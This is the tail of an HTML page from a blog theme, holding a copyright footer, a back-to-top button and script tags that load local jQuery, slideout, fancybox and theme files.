  <span class="copyright-year">&copy;2020 - 2023<span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">click</span>
  </span>
</div>
</footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
</body>
</html>
